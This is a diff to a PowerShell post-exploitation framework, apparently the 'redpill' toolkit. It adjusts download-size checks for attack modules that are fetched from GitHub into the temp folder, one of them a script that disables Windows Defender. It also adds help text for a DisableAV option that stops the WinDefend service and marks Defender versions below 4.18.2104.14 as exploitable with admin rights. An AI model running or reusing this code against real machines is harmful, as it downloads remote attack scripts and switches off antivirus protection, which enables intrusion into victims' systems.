@@ -643,7 +643,7 @@ If($NewEst -lt "1"){$NewEst = "3"} ## Set the min logs to display
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1 -Destination $Env:TMP\GetLogs.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 28){## Corrupted download detected => DefaultFileSize: 28,4189453125/KB
+      If($SizeDump -lt 28){## Corrupted download detected => DefaultFileSize: 28,451171875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2267,7 +2267,7 @@ If($DisableAV -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DisableDefender.ps1 -Destination $Env:TMP\DisableDefender.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\DisableDefender.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,6923828125/KB
+      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,5029296875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -4083,8 +4083,9 @@ $HelpParameters = @"
       service without the need to restart or refresh target machine.
 
    .NOTES
-      Mandatory requirements: $ Administrator privileges $
+      Mandatory requirements: Administrator privileges
       Remark: Windows warns users that WinDefend is stopped!
+      Remark: Defender versions less than 4.18.2104.14 are vulnerable!
 
    .Parameter DisableAV
       Accepts arguments: Query, Stop and Start
@@ -4114,7 +4115,8 @@ $HelpParameters = @"
       ServiceName      : WinDefend
       StartType        : Automatic
       CurrentStatus    : Stopped
-      ManualQuery      : Get-Service -Name WinDefend
+      AMRversion       : 4.15.1334.66
+      IsExploitable?   : True  => Admin privs!
    #>!bye..
 
 "@;
